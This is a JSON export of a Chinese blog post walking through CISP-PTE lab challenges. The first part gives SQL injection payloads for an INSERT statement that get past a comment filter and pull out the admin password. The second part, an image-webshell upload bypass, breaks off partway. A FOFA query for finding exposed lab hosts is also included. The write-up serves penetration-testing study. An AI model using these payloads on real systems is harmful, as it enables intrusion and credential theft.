{"title":"CISP-PTE题目及通关","uid":"68ff34205b12ff036bf404f00edb0431","slug":"CISP-PTE题目及通关","date":"2023-01-03T12:16:47.150Z","updated":"2023-01-03T14:51:54.736Z","comments":true,"path":"api/articles/CISP-PTE题目及通关.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-wy3rxp.jpg","content":"<h1 id=\"CISP-PTE题目及通关\"><a href=\"#CISP-PTE题目及通关\" class=\"headerlink\" title=\"CISP-PTE题目及通关\"></a>CISP-PTE题目及通关</h1><h2 id=\"靶场获取\"><a href=\"#靶场获取\" class=\"headerlink\" title=\"靶场获取\"></a>靶场获取</h2><p>FOFA搜索引擎</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">body&#x3D;&quot;CISP-PTE&quot;</code></pre>\n\n\n\n<h2 id=\"通关过程\"><a href=\"#通关过程\" class=\"headerlink\" title=\"通关过程\"></a>通关过程</h2><h3 id=\"基础题目一：SQL注入\"><a href=\"#基础题目一：SQL注入\" class=\"headerlink\" title=\"基础题目一：SQL注入\"></a>基础题目一：SQL注入</h3><p>题目如图</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103203413510.png\" alt=\"image-20230103203413510\"></p>\n<p>进入页面</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103203430837.png\" alt=\"image-20230103203430837\"></p>\n<p>先尝试下用万能密码登录</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103204705144.png\" alt=\"image-20230103204705144\"></p>\n<p>失败了,注册个账号试试</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213222804.png\" alt=\"image-20230103213222804\"></p>\n<p>注册成功,这种界面一看就很像有注入点</p>\n<p>点击发表选项,可以看到过滤规则</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213322628.png\" alt=\"image-20230103213322628\"></p>\n<p>正常写一篇文章试试</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213424234.png\" alt=\"image-20230103213424234\"></p>\n<p>可以看见，这是一条插入语句，该插入方式的特点就是，插入的字段必须与表字段个数相同，多一个少一个都不行。由此可知应该有四个字段</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213516185.png\" alt=\"image-20230103213516185\"></p>\n<p>返回首页看一下字段显示是否是2&#x2F;3段</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213633594.png\" alt=\"image-20230103213633594\"></p>\n<p>是2&#x2F;3段位显示的位数，按照往常的只要能把后面的东西注释掉，然后把select语句或者直接利用报错注入插进去就行了，问题就是–、#都给过滤了</p>\n<p>再仔细阅读过滤规则,查询strstr()函数用法</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213803670.png\" alt=\"image-20230103213803670\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103213928297.png\" alt=\"image-20230103213928297\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103214433713.png\" alt=\"image-20230103214433713\"></p>\n<p>可知我们输入的sql语句会循环过滤调注释符’#‘和’–‘，并且先过滤’–‘后过滤’#‘。尝试绕过过滤，构造<code>#-#--- </code>末尾有空格，过滤后即为–（空格)，达到注释的目的。</p>\n<p><code> insert article1 value(&#39;05B3250A-A1F2-0C27-9869-5CFF2D53451A&#39;,&#39;标题&#39;,&#39;内容&#39;,&#39;用户名&#39;)</code></p>\n<p>尝试insert注入，我们可以选择在标题和内容的字段注入。但是在内容处注入，由于需要闭合’‘，我们所需执行的sql语句被单引号‘包裹，不能回显执行全部内容，如同 <code>&#39;+ascii(substr((select database()),1,1))+&#39;</code>此类盲注，所以选择在标题处进行注入。标题处注入，可以闭合标题，将内容作为sql语句执行结果回显，用户名后面的语句进行注释。</p>\n<p> 标题处构造payload:</p>\n<p><code>version&#39;,(select version()),&#39;123&#39;) #-#--- </code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103215552042.png\" alt=\"image-20230103215552042\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103215601585.png\" alt=\"image-20230103215601585\"></p>\n<p>成功,继续爆数据</p>\n<p>查当前数据库，payload：<code>database&#39;,(select database()),&#39;123&#39;) #-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103215758518.png\" alt=\"image-20230103215758518\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103215806564.png\" alt=\"image-20230103215806564\"></p>\n<p>查所有数据库， payload：<code>schema_name&#39;,(select group_concat(schema_name) from information_schema.schemata),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103215858769.png\" alt=\"image-20230103215858769\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103215907739.png\" alt=\"image-20230103215907739\"></p>\n<p>显然我们的目标数据库是2web</p>\n<p>查该数据库下所有表， payload：<code>table_name&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;2web&#39;),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103220014203.png\" alt=\"image-20230103220014203\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103220023161.png\" alt=\"image-20230103220023161\"></p>\n<p>查询users1列名，payload:<code>column_name&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;2web&#39; and table_name=&#39;users1&#39;),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103220151712.png\" alt=\"image-20230103220151712\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103220159928.png\" alt=\"image-20230103220159928\"></p>\n<p>发现有username，password两列，尝试爆出users1的所有数据，payload：<code>users1&#39;,(select group_concat(username,&#39;_&#39;,password) from users1),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103220512458.png\" alt=\"image-20230103220512458\"></p>\n<p>没有成功,猜测可能对insert插入字段字符串长度做了限制，查询长度过长</p>\n<p>那就一个一个爆名字吧</p>\n<p><code>user&#39;,(select username from users1 limit 0,1),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103221628098.png\" alt=\"image-20230103221628098\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103221635819.png\" alt=\"image-20230103221635819\"></p>\n<p>爆出一个admin用户</p>\n<p><code>user&#39;,(select username from users1 limit 1,1),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103221726949.png\" alt=\"image-20230103221726949\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103221736406.png\" alt=\"image-20230103221736406\"></p>\n<p><code>user&#39;,(select username from users1 limit 2,1),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103221806667.png\" alt=\"image-20230103221806667\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103221826022.png\" alt=\"image-20230103221826022\"></p>\n<p>123已经是我们自己创建的用户了,估计key就在admin用户</p>\n<p><code>password&#39;,(select password from users1 where username=&#39;admin&#39;),&#39;123&#39;)#-#--- a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103222001672.png\" alt=\"image-20230103222001672\"></p>\n<p>得到key</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103222016072.png\" alt=\"image-20230103222016072\"></p>\n<h3 id=\"基础题目二：文件上传突破\"><a href=\"#基础题目二：文件上传突破\" class=\"headerlink\" title=\"基础题目二：文件上传突破\"></a>基础题目二：文件上传突破</h3><p>题目如图</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103222243142.png\" alt=\"image-20230103222243142\"></p>\n<p>开始答题</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103222616670.png\" alt=\"image-20230103222616670\"></p>\n<p>简单了解一下涉及函数</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103222928218.png\" alt=\"image-20230103222928218\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103223030405.png\" alt=\"image-20230103223030405\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103223106961.png\" alt=\"image-20230103223106961\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103223203213.png\" alt=\"image-20230103223203213\"></p>\n<p>这段函数大概意思就是上传的文件的储存路径是文件名加随机数的md5值拼接而成</p>\n<p>直接上传php会报错</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103223841944.png\" alt=\"image-20230103223841944\"></p>\n<p>制作一个图片马上传呢</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103224113601.png\" alt=\"image-20230103224113601\"></p>\n<p>抓包</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103224225077.png\" alt=\"image-20230103224225077\"></p>\n<p>尝试改后缀</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103224310357.png\" alt=\"image-20230103224310357\"></p>\n<p>直接php不行,尝试大小写绕过</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230103225117284.png\" alt=\"image-20230103225117284\"></p>\n<p>依旧失败,查询后得知会识别eval函数,大小写再绕过一下</p>\n","feature":true,"text":"CISP-PTE题目及通关靶场获取FOFA搜索引擎 body&#x3D;&quot;CISP-PTE&quot; 通关过程基础题目一：SQL注入题目如图 进入页面 先尝试下用万能密码登录 失败了,注册个账号试试 注册成功,这种界面一看就很像有注入点 点击发表选项,可以看到过滤规则...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":17,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"CISP-PTE","slug":"CISP-PTE","count":1,"path":"api/tags/CISP-PTE.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CISP-PTE%E9%A2%98%E7%9B%AE%E5%8F%8A%E9%80%9A%E5%85%B3\"><span class=\"toc-text\">CISP-PTE题目及通关</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">靶场获取</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%80%9A%E5%85%B3%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">通关过程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E4%B8%80%EF%BC%9ASQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">基础题目一：SQL注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AA%81%E7%A0%B4\"><span class=\"toc-text\">基础题目二：文件上传突破</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"DC-1靶机渗透详解","uid":"9ad4b35bee6dc5b3bef9da6cf161cc25","slug":"DC-1靶机渗透","date":"2023-01-03T11:12:52.175Z","updated":"2023-01-03T11:25:04.644Z","comments":true,"path":"api/articles/DC-1靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-p2rzop.jpg","text":"dc-1靶机渗透过程详解一:实验环境kali攻击机:192.168.2.103 DC-1靶机”192.168.1.128 二:信息收集主机发现nmap -sP 192.168.1.0/24 端口发现masscan --rate=10000 --ports 0-65535 192....","link":"","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":17,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":4,"path":"api/tags/DC系列靶机.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"feature":true}}